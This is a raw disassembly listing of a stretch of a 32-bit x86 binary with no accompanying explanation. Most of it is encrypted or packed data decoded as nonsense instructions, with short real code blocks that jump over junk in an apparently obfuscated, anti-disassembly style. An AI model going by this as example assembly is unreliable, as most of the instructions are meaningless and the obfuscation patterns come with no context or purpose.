  40fca5:	repnz push ebp
  40fca7:	mov    edx,0xef3662db
  40fcac:	xlat   BYTE PTR ds:[ebx]
  40fcad:	(bad)  
  40fcae:	push   dx
  40fcb0:	in     al,0x85
  40fcb2:	les    ebp,FWORD PTR [ebx]
  40fcb4:	sub    bh,BYTE PTR [eax]
  40fcb6:	xor    dl,BYTE PTR [esi]
  40fcb8:	int    0x49
  40fcba:	inc    ebx
  40fcbb:	and    BYTE PTR [ebp-0x935483],dh
  40fcc1:	adc    edi,edx
  40fcc3:	icebp  
  40fcc4:	add    eax,0x4414f57d
  40fcc9:	mov    ?,WORD PTR [ebx]
  40fccb:	jmp    0xafaca25
  40fcd0:	(bad)  
  40fcd1:	dec    edx
  40fcd2:	scas   al,BYTE PTR es:[edi]
  40fcd3:	mov    ds:0x92c253ff,eax
  40fcd8:	cwde   
  40fcd9:	icebp  
  40fcda:	data16 inc bx
  40fcdd:	push   ebx
  40fcde:	data16 lods al,BYTE PTR ds:[esi]
  40fce0:	mov    WORD PTR [edx+0x3f],es
  40fce3:	inc    ebx
  40fce4:	adc    DWORD PTR [eax-0x2b37eef4],ebx
  40fcea:	aas    
  40fceb:	test   al,0x88
  40fced:	clc    
  40fcee:	pop    esp
  40fcef:	aaa    
  40fcf0:	fild   QWORD PTR ds:0x3f7fdb9f
  40fcf6:	xor    al,BYTE PTR [edx+0x388a586d]
  40fcfc:	aad    0x7b
  40fcfe:	hlt    
  40fcff:	pop    edi
  40fd00:	sbb    BYTE PTR [edx],dh
  40fd02:	dec    eax
  40fd03:	mov    edi,0x2c6e2167
  40fd08:	jle    0x40fd4a
  40fd0a:	rcr    esp,0x59
  40fd0d:	cmp    al,0xf0
  40fd0f:	scas   eax,DWORD PTR es:[edi]
  40fd10:	scas   eax,DWORD PTR es:[edi]
  40fd11:	dec    ecx
  40fd12:	xchg   BYTE PTR [ebx],al
  40fd14:	pop    ecx
  40fd15:	lea    ebx,[edi+0x5e]
  40fd18:	popa   
  40fd19:	xor    eax,0xbb85882
  40fd1e:	inc    eax
  40fd1f:	or     edi,DWORD PTR [esi-0x56eb0109]
  40fd25:	mov    al,0x22
  40fd27:	cmp    ebx,esi
  40fd29:	jnp    0x40fce3
  40fd2b:	loope  0x40fd3e
  40fd2d:	and    eax,0x342f4b24
  40fd32:	dec    eax
  40fd33:	pop    eax
  40fd34:	push   ss
  40fd35:	add    esp,DWORD PTR [ecx]
  40fd37:	xor    BYTE PTR [esi+eiz*4+0x1f73c4c7],0x14
  40fd3f:	pop    edi
  40fd40:	ins    BYTE PTR es:[edi],dx
  40fd41:	fs out dx,eax
  40fd43:	inc    ebp
  40fd44:	(bad)  
  40fd45:	(bad)  
  40fd46:	das    
  40fd47:	fimul  DWORD PTR [ecx]
  40fd49:	leave  
  40fd4a:	inc    edi
  40fd4b:	sbb    DWORD PTR [edx-0x7],esi
  40fd4e:	adc    esi,DWORD PTR [esi-0x41d77eab]
  40fd54:	shl    BYTE PTR [ebp+0x61],1
  40fd57:	and    ebx,eax
  40fd59:	jbe    0x40fdcc
  40fd5b:	inc    ecx
  40fd5c:	adc    eax,0x4f5bd2ef
  40fd61:	retf   
  40fd62:	cmp    ah,BYTE PTR [esi+0x399d52ba]
  40fd68:	fistp  DWORD PTR [edx]
  40fd6a:	mov    ah,0x87
  40fd6c:	sub    dl,BYTE PTR [ebx*4+0x78b4181c]
  40fd73:	pusha  
  40fd74:	adc    ebx,ebx
  40fd76:	out    dx,eax
  40fd77:	or     eax,ecx
  40fd79:	inc    ecx
  40fd7a:	sbb    ah,BYTE PTR [esi]
  40fd7c:	mov    WORD PTR [bx+di],fs
  40fd7f:	cmp    DWORD PTR [eax+eiz*2],ebx
  40fd82:	pushf  
  40fd83:	mov    ebx,0x4caa32d4
  40fd88:	push   eax
  40fd89:	test   DWORD PTR [ebp-0x27],ecx
  40fd8c:	ror    DWORD PTR [edx-0x6ededa50],1
  40fd92:	pmulhw mm2,QWORD PTR [eax]
  40fd95:	test   eax,0x358a45d
  40fd9a:	aaa    
  40fd9b:	ins    DWORD PTR es:[edi],dx
  40fd9c:	add    esi,ebp
  40fd9e:	cli    
  40fd9f:	pop    edi
  40fda0:	xor    eax,0x3c5ca38c
  40fda5:	mov    bl,0x12
  40fda7:	xchg   esp,eax
  40fda8:	daa    
  40fda9:	push   edi
  40fdaa:	call   0x92926de5
  40fdaf:	push   edi
  40fdb0:	or     al,0x5c
  40fdb2:	fcmovnb st,st(2)
  40fdb4:	cwde   
  40fdb5:	int    0xf0
  40fdb7:	sub    DWORD PTR [eax-0x45ca309b],edx
  40fdbd:	pop    eax
  40fdbe:	out    dx,al
  40fdbf:	add    al,BYTE PTR [esi]
  40fdc1:	arpl   WORD PTR [eax-0x5a976003],bp
  40fdc7:	fwait
  40fdc8:	int3   
  40fdc9:	mov    cs,WORD PTR [ecx-0x44a160c2]
  40fdcf:	loopne 0x40fda7
  40fdd1:	cdq    
  40fdd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdd3:	jp     0x40fd99
  40fdd5:	cmp    al,0x3c
  40fdd7:	out    dx,al
  40fdd8:	cmp    esp,eax
  40fdda:	cli    
  40fddb:	int3   
  40fddc:	loope  0x40fe4c
  40fdde:	inc    ecx
  40fddf:	sbb    ah,BYTE PTR [edx]
  40fde1:	xchg   esi,eax
  40fde2:	sub    eax,0xfe7319d3
  40fde7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fde8:	or     eax,ecx
  40fdea:	mov    ecx,DWORD PTR [ebp-0x20]
  40fded:	mov    ecx,DWORD PTR [ebp-0x1c]
  40fdf0:	and    edx,0x76f2
  40fdf6:	or     edx,edi
  40fdf8:	xor    edx,esi
  40fdfa:	xor    eax,0x253b
  40fdff:	shld   edx,eax,0x2
  40fe03:	shl    eax,0x2
  40fe06:	shr    ecx,0x1e
  40fe09:	xor    esi,esi
  40fe0b:	or     eax,ecx
  40fe0d:	or     edx,esi
  40fe0f:	xor    eax,0xcb79b576
  40fe14:	mov    DWORD PTR [ebp-0x20],eax
  40fe17:	mov    esi,0x9c2b8ae8
  40fe1c:	xor    edx,esi
  40fe1e:	mov    DWORD PTR [ebp-0x1c],edx
  40fe21:	mov    eax,DWORD PTR [ebp-0x38]
  40fe24:	mov    ecx,DWORD PTR [ebp-0x34]
  40fe27:	mov    edx,DWORD PTR [ebp-0x40]
  40fe2a:	mov    edi,DWORD PTR [ebp-0x3c]
  40fe2d:	push   edi
  40fe2e:	push   edx
  40fe2f:	push   ecx
  40fe30:	push   eax
  40fe31:	call   0x41594e
  40fe36:	add    eax,0x536a
  40fe3b:	adc    edx,0x9573
  40fe41:	push   0x12613
  40fe46:	push   0xae21daec
  40fe4b:	push   edx
  40fe4c:	push   eax
  40fe4d:	call   0x4222a7
  40fe52:	mov    ecx,eax
  40fe54:	mov    eax,DWORD PTR [ebp-0x20]
  40fe57:	mov    ebx,DWORD PTR [ebp-0x1c]
  40fe5a:	xor    ecx,0x1b8b
  40fe60:	xor    edi,edi
  40fe62:	xor    edx,edi
  40fe64:	add    ecx,eax
  40fe66:	mov    eax,DWORD PTR [ebp+0xc]
  40fe69:	adc    edx,ebx
  40fe6b:	mov    DWORD PTR [eax],ecx
  40fe6d:	mov    DWORD PTR [eax+0x4],edx
  40fe70:	mov    eax,DWORD PTR [ebp-0x30]
  40fe73:	mov    ecx,DWORD PTR [ebp-0x2c]
  40fe76:	mov    edx,0xbdb2
  40fe7b:	sub    edx,eax
  40fe7d:	jmp    0x410231
  40fe82:	(bad)  
  40fe83:	out    dx,eax
  40fe84:	ins    BYTE PTR es:[edi],dx
  40fe85:	and    BYTE PTR [esp+edi*4+0x3f7f08b],bh
  40fe8c:	or     bh,0xac
  40fe8f:	pop    edx
  40fe90:	stos   BYTE PTR es:[edi],al
  40fe91:	jecxz  0x40fe37
  40fe93:	sub    al,0xbe
  40fe95:	mov    esi,0xbebec4e3
  40fe9a:	popf   
  40fe9b:	push   es
  40fe9c:	js     0x40fe30
  40fe9e:	pop    esi
  40fe9f:	sbb    eax,0x61d4ba0
  40fea4:	mov    esp,0x63d5776d
  40fea9:	inc    esi
  40feaa:	mov    ecx,0xa5e7dd05
  40feaf:	mov    ebp,0x4f3af153
  40feb4:	and    BYTE PTR [edx],ah
  40feb6:	ins    DWORD PTR es:[edi],dx
  40feb7:	xchg   esp,eax
  40feb8:	aas    
  40feb9:	xchg   esi,eax
  40feba:	jl     0x40febc
  40febc:	adc    BYTE PTR [ebp-0x5aad3440],0x8e
  40fec3:	sub    eax,0xfd78cda3
  40fec8:	mov    DWORD PTR [ebx],0x4f2bec4e
  40fece:	ret    0xdf88
  40fed1:	mov    esi,0x4c58c5d3
  40fed6:	ins    BYTE PTR es:[edi],dx
  40fed7:	in     eax,0x72
  40fed9:	sbb    al,0x4d
  40fedb:	mov    ?,WORD PTR [edi-0x673677c0]
  40fee1:	jle    0x40ff14
  40fee3:	out    0x20,eax
  40fee5:	inc    ebx
  40fee6:	mov    ebx,0xffc3e97b
  40feeb:	jp     0x40feda
  40feed:	xor    al,0x86
  40feef:	push   edx
  40fef0:	stos   DWORD PTR es:[edi],eax
  40fef1:	es aaa 
  40fef3:	sbb    ebx,DWORD PTR [ebx]
  40fef5:	fnstenv [edi-0x4e]
  40fef8:	push   cs
  40fef9:	add    al,0xc
  40fefb:	out    dx,eax
  40fefc:	cmp    eax,0x828e0605
  40ff01:	xor    ch,BYTE PTR [esi]
  40ff03:	jo     0x40ff40
  40ff05:	pop    ebx
  40ff06:	clc    
  40ff07:	ins    BYTE PTR es:[edi],dx
  40ff08:	push   ds
  40ff09:	sub    BYTE PTR [edx+edx*1],dh
  40ff0c:	adc    DWORD PTR [ecx],edi
  40ff0e:	outs   dx,BYTE PTR ds:[esi]
  40ff0f:	(bad)  
  40ff10:	cld    
  40ff11:	push   es
  40ff12:	xchg   DWORD PTR [edi+ecx*8+0x1c],ebx
  40ff16:	and    BYTE PTR [ecx],ch
  40ff18:	jl     0x40ff56
  40ff1a:	cmp    esp,DWORD PTR [ebx]
  40ff1c:	jo     0x40ff68
  40ff1e:	test   al,0x53
  40ff20:	inc    edx
  40ff21:	rcr    DWORD PTR [edi-0x43],1
  40ff24:	fndisi(8087 only) 
  40ff26:	mov    al,ds:0x197eeb0
  40ff2b:	push   0x15c77005
  40ff30:	stos   DWORD PTR es:[edi],eax
  40ff31:	enter  0x2ab1,0xd3
  40ff35:	mov    fs,WORD PTR [eax-0x50874566]
  40ff3b:	(bad)  
  40ff3c:	in     eax,0x54
  40ff3e:	jns    0x40ff1d
  40ff40:	inc    esi
  40ff41:	mov    bh,0xa7
  40ff43:	ret    
  40ff44:	jne    0x40ff7e
  40ff46:	sub    al,0xc1
  40ff48:	sub    esp,DWORD PTR [esp+edi*4-0x4f]
  40ff4c:	mov    edx,0xb41323bb
  40ff51:	rcr    BYTE PTR [edx],1
  40ff53:	pop    edi
  40ff54:	pop    eax
  40ff55:	cwde   
  40ff56:	xor    cl,BYTE PTR [esi]
  40ff58:	addr16 daa 
  40ff5a:	or     al,0x33
  40ff5c:	dec    ebp
  40ff5d:	dec    edx
  40ff5e:	in     al,0xc5
  40ff60:	mov    bh,0xeb
  40ff62:	arpl   WORD PTR [ebp+0x3a93c56b],bp
  40ff68:	sub    cl,BYTE PTR [eax-0x74]
  40ff6b:	mov    ds:0x9c0af999,al
  40ff70:	call   0x9f2e1674
  40ff75:	add    ah,BYTE PTR [ebp+ebx*2-0x61]
  40ff79:	imul   bh
  40ff7b:	es pushf 
  40ff7d:	in     al,0x9c
  40ff7f:	loope  0x40ffa8
  40ff81:	pusha  
  40ff82:	les    eax,FWORD PTR [ebx-0x71c83c28]
  40ff88:	inc    esi
  40ff89:	mov    edi,0x550d6f3d
  40ff8e:	popf   
  40ff8f:	inc    ecx
  40ff90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff91:	ds jne 0x40ff2d
  40ff94:	jge    0x40fff4
  40ff96:	add    cl,BYTE PTR [esp+edi*8-0x649866a9]
  40ff9d:	fs push 0xffffffa6
  40ffa0:	adc    bl,BYTE PTR [ebx]
  40ffa2:	punpcklwd mm4,DWORD PTR [ecx-0x160dc259]
  40ffa9:	push   0x6b
  40ffab:	inc    ebx
  40ffac:	rcr    bh,cl
  40ffae:	sub    BYTE PTR [ecx+ebp*1],0xcc
  40ffb2:	jns    0x40ff71
  40ffb4:	fwait
  40ffb5:	mov    esp,0xa7e346ae
  40ffba:	sub    esi,DWORD PTR [edi-0x11f55316]
  40ffc0:	data16 scas al,BYTE PTR es:[edi]
  40ffc2:	leave  
  40ffc3:	das    
  40ffc4:	mov    ecx,0x7dd507bc
  40ffc9:	mov    bh,cl
  40ffcb:	test   BYTE PTR [edi+0x2b57e321],0x4
  40ffd2:	adc    al,BYTE PTR [edi-0x57]
  40ffd5:	lds    ebp,FWORD PTR [esi]
  40ffd7:	pop    ecx
  40ffd8:	cmp    BYTE PTR fs:[ecx-0x23],bh
  40ffdc:	xchg   ebp,eax
  40ffdd:	push   esp
  40ffde:	dec    ebx
  40ffdf:	mov    al,ds:0x6c8e2ae0
  40ffe4:	(bad)  
  40ffe5:	icebp  
  40ffe6:	aaa    
  40ffe7:	icebp  
  40ffe8:	pop    esi
  40ffe9:	adc    eax,0x1ffa6353
  40ffee:	dec    edi
  40ffef:	mov    ecx,0x1b39f602
  40fff4:	mov    ds:0x926a2fa2,eax
  40fff9:	cli    
  40fffa:	sub    DWORD PTR [esi+0xd],0xb9bd5faa
  410001:	out    dx,al
  410002:	test   eax,0x15781879
  410007:	pop    edx
  410008:	xchg   esp,eax
  410009:	das    
  41000a:	loope  0x40ff96
  41000c:	inc    edi
  41000d:	sbb    ebp,DWORD PTR [edi-0x66]
  410010:	imul   ebp,esi,0xffffffeb
  410013:	mov    ch,0xfb
  410015:	sbb    edi,DWORD PTR [ebp-0x70c381d6]
  41001b:	sub    BYTE PTR [esi-0x68],al
  41001e:	jnp    0x40fff7
  410020:	cmp    edx,0x60
  410023:	dec    eax
  410024:	sbb    DWORD PTR [ecx+0x7d],ecx
  410027:	mov    ch,0x78
  410029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41002a:	xchg   ecx,eax
  41002b:	outs   dx,BYTE PTR cs:[esi]
  41002d:	imul   eax,ecx,0xffffffc3
  410030:	cmp    BYTE PTR [edx-0x760d5ed1],al
  410036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410037:	mov    edi,edx
  410039:	sub    esi,DWORD PTR [edi-0x50]
  41003c:	and    bh,BYTE PTR [ecx-0x15]
  41003f:	dec    esi
  410040:	push   ds
  410041:	sub    BYTE PTR [edx],ch
  410043:	sbb    ah,0x9d
  410046:	(bad)  
  410047:	cmp    DWORD PTR [edx],ebp
  410049:	retf   0x1c5
  41004c:	sbb    bl,BYTE PTR [edi+0x40]
  41004f:	or     dh,ah
  410051:	adc    bl,al
  410053:	iret   
  410054:	jne    0x40ffdb
  410056:	sbb    bl,0x2c
  410059:	mov    ds:0xe32f1a41,eax
  41005e:	or     ch,BYTE PTR [ecx]
  410060:	das    
  410061:	mov    esi,0x906483c9
  410066:	stos   BYTE PTR es:[edi],al
  410067:	xchg   ebx,eax
  410068:	mov    BYTE PTR [ecx],bl
  41006a:	jecxz  0x410074
  41006c:	popf   
  41006d:	out    0xb,al
  41006f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410070:	push   esp
  410071:	lea    eax,[edi]
  410073:	push   ebx
  410074:	ja     0x4100a3
  410076:	jne    0x4100dc
  410078:	mov    dh,al
  41007a:	mov    esp,0x7ddb88bb
  41007f:	shl    BYTE PTR [ebx+ebp*4-0x58],cl
  410083:	outs   dx,DWORD PTR ds:[esi]
  410084:	sub    ch,BYTE PTR [ecx-0x5ee3ba4]
  41008a:	or     BYTE PTR [ecx+eax*8-0x3ba26992],ch
  410091:	ret    
  410092:	add    DWORD PTR [si+0x2e7],0x4
  410098:	add    BYTE PTR [ebx+ebx*4],al
  41009b:	xor    al,0x20
  41009d:	inc    esi
  41009e:	int    0x71
  4100a0:	aaa    
  4100a1:	push   ss
  4100a2:	lods   eax,DWORD PTR ds:[esi]
  4100a3:	aas    
  4100a4:	in     eax,0x69
  4100a6:	dec    esp
  4100a7:	and    BYTE PTR [ebp+0x4f0ae446],bh
  4100ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100ae:	jge    0x41009e
  4100b0:	dec    esp
  4100b1:	mov    ebx,0x5fb43300
  4100b6:	fdivr  st,st(2)
  4100b8:	xlat   BYTE PTR ds:[ebx]
  4100b9:	sub    al,0x71
  4100bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100bc:	lahf   
  4100bd:	rol    DWORD PTR [ebx+ebp*4],0x98
  4100c1:	lahf   
  4100c2:	in     al,0x56
  4100c4:	ds or  esp,edi
  4100c7:	fcomp  DWORD PTR [ebp+0x40]
  4100ca:	jno    0x41006d
  4100cc:	std    
  4100cd:	inc    ebx
  4100ce:	xor    BYTE PTR [eax],ch
  4100d0:	dec    ecx
  4100d1:	cmp    BYTE PTR [eax+ebx*4+0x7da90e55],dh
  4100d8:	aaa    
  4100d9:	enter  0x21bb,0x4
  4100dd:	int    0xd9
  4100df:	imul   BYTE PTR [bp+di-0x55bc]
  4100e4:	stos   BYTE PTR es:[edi],al
  4100e5:	fnsave [edi+edx*1-0x52]
  4100e9:	adc    DWORD PTR [ecx+ecx*4+0x7e03eb70],ebp
  4100f0:	loop   0x410159
  4100f2:	aad    0xa
  4100f4:	mov    ch,0x1a
  4100f6:	stc    
  4100f7:	or     eax,0x50c29324
  4100fc:	repnz (bad) 
  4100fe:	out    0xff,al
  410100:	test   BYTE PTR [eax-0x14],bl
  410103:	or     DWORD PTR [ebx+0x5a],esi
  410106:	mov    ebp,0xa66af915
  41010b:	mov    BYTE PTR [esi],bh
  41010d:	xchg   edi,eax
  41010e:	sbb    al,0xb6
  410110:	or     bl,cl
  410112:	add    cl,al
  410114:	mov    eax,0x177c9401
  410119:	popa   
  41011a:	jno    0x4100a1
  41011c:	icebp  
  41011d:	push   0xffffffe1
  41011f:	out    0xa,eax
  410121:	add    bl,BYTE PTR [ecx-0x51]
  410124:	xchg   BYTE PTR [ebx],ch
  410126:	gs out dx,eax
  410128:	int3   
  410129:	jb     0x4100fa
  41012b:	cmp    dl,BYTE PTR [edx+0x3a145c56]
  410131:	xor    ebp,DWORD PTR [edi+0x576cbc76]
  410137:	cmp    al,0x31
  410139:	and    cl,bl
  41013b:	inc    esp
  41013c:	jnp    0x410141
  41013e:	adc    al,BYTE PTR [eax]
  410140:	or     BYTE PTR [eax],0x6b
  410143:	and    eax,DWORD PTR [edx-0x15]
  410146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410147:	popf   
  410148:	sbb    DWORD PTR [eax+0x14],ecx
  41014b:	xor    al,0xd3
  41014d:	and    al,0x2f
  41014f:	mov    al,0x3b
  410151:	sahf   
  410152:	jecxz  0x4101b4
  410154:	jbe    0x41017b
  410156:	cs adc eax,0x676c7a22
  41015c:	pop    es
  41015d:	add    eax,0x34450013
  410162:	inc    BYTE PTR [ecx]
  410164:	lahf   
  410165:	cmp    eax,0x69ef9a9b
  41016a:	ror    ecx,0xfe
  41016d:	jmp    0xb308be56
  410172:	mov    ecx,0x58cb7011
  410177:	and    al,0xfe
  410179:	adc    ebp,DWORD PTR ds:0xf108fa0b
  41017f:	outs   dx,DWORD PTR ds:[esi]
  410180:	fild   QWORD PTR [esi+edx*4]
  410183:	dec    ebx
  410184:	retf   0x15d4
  410187:	dec    esi
  410188:	xchg   ebp,eax
  410189:	mov    bl,dh
  41018b:	add    DWORD PTR [ebx+ebx*1-0x7],ebp
  41018f:	xchg   DWORD PTR [edi+0x17d9d7a0],esi
  410195:	scas   eax,DWORD PTR es:[edi]
  410196:	adc    al,0xfa
  410198:	aaa    
  410199:	arpl   WORD PTR [edx+0x2c],bx
  41019c:	rdmsr  
  41019e:	adc    eax,esp
  4101a0:	repz xor eax,0x95570fe8
  4101a6:	xchg   ebx,eax
  4101a7:	xchg   ebx,eax
  4101a8:	test   DWORD PTR ds:0xf5a23420,0xed52891
  4101b2:	or     BYTE PTR [esi-0x130b6b57],al
  4101b8:	or     al,0x2b
  4101ba:	jne    0x41022c
  4101bc:	(bad)  
  4101bd:	and    eax,DWORD PTR [ebx+0x6]
  4101c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101c1:	popa   
  4101c2:	jmp    0x697a:0x6267016
  4101c9:	sbb    edx,ebx
  4101cb:	xchg   edx,eax
  4101cc:	addr16 (bad) 
  4101ce:	ror    BYTE PTR [esi+0x19],1
  4101d1:	(bad)  
  4101d2:	push   ss
  4101d3:	pop    ds
  4101d4:	das    
  4101d5:	or     DWORD PTR [edi-0x3],edx
  4101d8:	mov    ch,0x1d
  4101da:	push   edi
  4101db:	popa   
  4101dc:	inc    ebp
  4101dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101de:	cs aas 
  4101e0:	lahf   
  4101e1:	shr    BYTE PTR [edx-0x1],0x68
  4101e5:	cs ins DWORD PTR es:[edi],dx
  4101e7:	data16 jnp 0x41018d
  4101ea:	loopne 0x410205
  4101ec:	jmp    0xc88a:0x989ed26a
  4101f3:	mov    eax,0xa1ba70ee
  4101f8:	mov    edx,0xd76ff08a
  4101fd:	fisub  DWORD PTR ds:0x12e35d33
  410203:	icebp  
  410204:	lods   eax,DWORD PTR ds:[esi]
  410205:	mov    ch,ah
  410207:	and    ch,BYTE PTR [edi+eax*8+0x28]
  41020b:	jns    0x4101db
  41020d:	mov    edi,0x2b8e3474
  410212:	cld    
  410213:	fidivr WORD PTR [esi+eiz*1]
  410216:	cmc    
  410217:	dec    eax
  410218:	int    0x15
  41021a:	das    
  41021b:	mov    eax,DWORD PTR ds:0xff2f3dab
  410221:	push   0x71c35f7
  410226:	jge    0x4101fb
  410228:	adc    BYTE PTR [ecx],al
  41022a:	out    0x41,al
  41022c:	sub    ch,bl
  41022e:	mov    bl,BYTE PTR [edx-0x20]
  410231:	mov    eax,DWORD PTR [ebp-0x28]
  410234:	mov    ebx,0x4c02
  410239:	sbb    ebx,ecx
  41023b:	mov    ecx,DWORD PTR [ebp-0x24]
  41023e:	sub    edx,eax
  410240:	mov    eax,DWORD PTR [ebp+0xc]
  410243:	sbb    ebx,ecx
  410245:	add    edx,DWORD PTR [eax]
  410247:	mov    ecx,DWORD PTR [ebp-0x28]
  41024a:	adc    ebx,DWORD PTR [eax+0x4]
  41024d:	push   0x2
  41024f:	xor    ebx,esi
  410251:	mov    esi,DWORD PTR [ebp-0x24]
  410254:	pop    esi
  410255:	sub    esi,ecx
  410257:	mov    ecx,DWORD PTR [ebp-0x30]
  41025a:	sub    esi,ecx
  41025c:	mov    eax,ebx
  41025e:	jmp    0x410612
  410263:	sub    DWORD PTR [esi-0x65853526],eax
  410269:	cmp    DWORD PTR [esi-0x6df308e8],esp
  41026f:	xor    ebp,esp
  410271:	or     bh,0xc9
  410274:	xor    al,0xbe
  410276:	mov    esi,0xbebec4e3
  41027b:	inc    ebp
  41027c:	pop    esp
  41027d:	mov    ebp,0xaa7544c1
  410282:	(bad)  
  410283:	shl    DWORD PTR [edi+0x39fa11af],cl
  410289:	pop    edx
  41028b:	sbb    al,0xb4
  41028d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41028e:	mov    eax,ds:0x84601a25
  410293:	xchg   ebp,eax
  410294:	or     eax,0x8a980183
  410299:	and    dh,BYTE PTR [esi-0x5]
  41029c:	jne    0x410301
  41029e:	sub    al,BYTE PTR [esi+0x7]
  4102a1:	ret    0x8ee8
  4102a4:	and    ah,cl
  4102a6:	mov    ebx,0xf4d0cb70
  4102ab:	xor    DWORD PTR ds:0x168dbc7a,0xffffff80
  4102b2:	xchg   esp,eax
  4102b3:	adc    eax,ebp
  4102b5:	rcl    ebx,1
  4102b7:	xchg   ecx,eax
  4102b8:	pusha  
  4102b9:	add    bl,al
  4102bb:	xchg   esi,eax
  4102bc:	sti    
  4102bd:	add    al,0x1c
  4102bf:	mov    edi,0x4f432da3
  4102c4:	fcmovu st,st(0)
  4102c6:	xor    eax,0x5bb883
  4102cb:	cs ja  0x41028b
  4102ce:	cmc    
  4102cf:	in     al,0x7f
  4102d1:	cmp    BYTE PTR [esi+0x5478290c],al
  4102d7:	jne    0x4102b8
  4102d9:	adc    ch,BYTE PTR [edx]
  4102db:	aad    0x72
  4102dd:	mov    esp,0xeaebdb4d
  4102e2:	je     0x4102f8
  4102e4:	or     cl,al
  4102e6:	dec    edx
  4102e7:	clc    
  4102e8:	in     eax,dx
  4102e9:	mov    edi,0x51adb748
  4102ee:	ins    DWORD PTR es:[edi],dx
  4102ef:	cmp    ah,bh
  4102f1:	rol    ecx,cl
  4102f3:	pop    ebx
  4102f4:	into   
  4102f5:	mov    cl,BYTE PTR ds:0x918f7718
  4102fb:	xor    bh,cl
  4102fd:	aad    0xc7
  4102ff:	cmp    edi,edx
  410301:	leave  
  410302:	loop   0x4102b1
  410304:	pop    ss
  410305:	test   BYTE PTR [eax-0x2],ah
  410308:	(bad)  
  410309:	out    0xb1,al
  41030b:	xlat   BYTE PTR ds:[ebx]
  41030c:	int3   
  41030d:	sub    ah,BYTE PTR [edx]
  41030f:	push   edx
  410310:	loope  0x4102ae
  410312:	sbb    BYTE PTR [eax+ebx*8+0x7516eed],dh
  410319:	sbb    ebp,DWORD PTR [ebp+0x7f]
  41031c:	cmc    
  41031d:	not    BYTE PTR [edx-0x56d9c028]
  410323:	inc    ecx
  410324:	stos   DWORD PTR es:[edi],eax
  410325:	(bad)  
  410326:	std    
  410327:	inc    eax
  410328:	mov    eax,0xbc19f0e9
  41032d:	push   ds
  41032e:	sub    eax,edi
  410330:	sbb    al,0x40
  410332:	dec    ebx
  410333:	(bad)  
  410334:	or     al,0x2
  410336:	mov    ebp,0xc2f349c5
  41033b:	cs push es
  41033d:	ror    BYTE PTR [ebx+0x57],0xfe
  410341:	clc    
  410342:	xchg   esi,eax
  410343:	mov    cl,0x54
  410345:	inc    edi
  410346:	js     0x410346
  410348:	and    edi,ebp
  41034a:	xor    cl,BYTE PTR ds:0xf6a8ac44
  410350:	cmp    al,0xdd
  410352:	fisttp QWORD PTR es:[ebx+edi*8-0x7368d8d2]
  41035a:	push   es
  41035b:	mov    edx,0xe1258bc9
  410360:	outs   dx,BYTE PTR ds:[esi]
  410361:	test   al,0xd9
  410363:	outs   dx,DWORD PTR ds:[esi]
  410364:	cmp    dl,BYTE PTR [esi+0x5a45964d]
  41036a:	cwde   
  41036b:	sar    BYTE PTR [edx],0x3e
  41036e:	push   edx
  41036f:	add    eax,0xae2b2e86
  410374:	mov    esi,edx
  410376:	ficom  WORD PTR [si+0x71]
  41037a:	sahf   
  41037b:	or     BYTE PTR [edi+0x4ac6dc10],ch
  410381:	fisubr DWORD PTR [edx-0x535f4a75]
  410387:	aas    
  410388:	stos   DWORD PTR es:[edi],eax
  410389:	ds dec esi
  41038b:	mov    edx,0x3b3550b3
  410390:	cmc    
  410391:	imul   esp,DWORD PTR [ebp+0x5d994d05],0xffffffce
  410398:	push   es
  410399:	mov    edi,0xc4753989
  41039e:	pmulhuw mm4,mm0
  4103a1:	ins    DWORD PTR es:[edi],dx
  4103a2:	dec    ebx
  4103a3:	xchg   BYTE PTR [eax-0x1],al
  4103a6:	out    0x52,al
  4103a8:	mov    fs,WORD PTR [ecx-0x569fa000]
  4103ae:	out    0x9f,al
  4103b0:	fstp   DWORD PTR [ebp+0x65c14c86]
  4103b6:	and    dl,BYTE PTR [esi-0x54]
  4103b9:	pop    edx
  4103ba:	sub    DWORD PTR [edx-0x7d],edi
  4103bd:	sbb    BYTE PTR [ebp+0x6bb55e34],0x22
  4103c4:	(bad)  
  4103c5:	icebp  
  4103c6:	data16 outs dx,BYTE PTR ds:[esi]
  4103c8:	fwait
  4103c9:	(bad)  
  4103ca:	sbb    eax,0xc7c4915a
  4103cf:	lock ror BYTE PTR [eax-0x35],0x1b
  4103d4:	pop    esi
  4103d5:	imul   ebp,DWORD PTR [ebp+0x7],0xf02e9d9
  4103dc:	cmp    eax,0x65b37ab9
  4103e1:	cli    
  4103e2:	cmp    ch,ah
  4103e4:	mov    ds:0x9427459f,eax
  4103e9:	pop    ss
  4103ea:	test   eax,0x38cd825c
  4103ef:	add    ebx,DWORD PTR [edi+0x2067caf3]
  4103f5:	js     0x410409
  4103f7:	test   DWORD PTR [ebx+ebp*8-0x2b552b35],esp
  4103fe:	dec    edi
  4103ff:	sbb    eax,0xb168f0e7
  410404:	sbb    dh,BYTE PTR [ecx+ebp*2]
  410407:	pop    esi
  410408:	fwait
  410409:	jecxz  0x4103ac
  41040b:	or     edi,DWORD PTR [edx+0x348782ca]
  410411:	lods   eax,DWORD PTR ds:[esi]
  410412:	ins    DWORD PTR es:[edi],dx
  410413:	xor    BYTE PTR [ebp+0x1f],cl
  410416:	idiv   DWORD PTR [eax-0x26c18e39]
  41041c:	cs and ah,al
  41041f:	xchg   ecx,eax
  410420:	ins    DWORD PTR es:[edi],dx
  410421:	es sub eax,0x20986c9f
  410427:	fs enter 0x234f,0x8d
  41042c:	sbb    eax,0x345fc545
  410431:	add    al,0x11
  410433:	inc    esi
  410434:	out    dx,eax
  410435:	xor    ebp,DWORD PTR cs:[ebp-0x555a3533]
  41043c:	in     eax,0x50
  41043e:	inc    ebx
  41043f:	and    edx,0xffffffd2
  410442:	mov    esi,0x51337662
  410447:	fisub  WORD PTR [eax+0x3a]
  41044a:	jp     0x410492
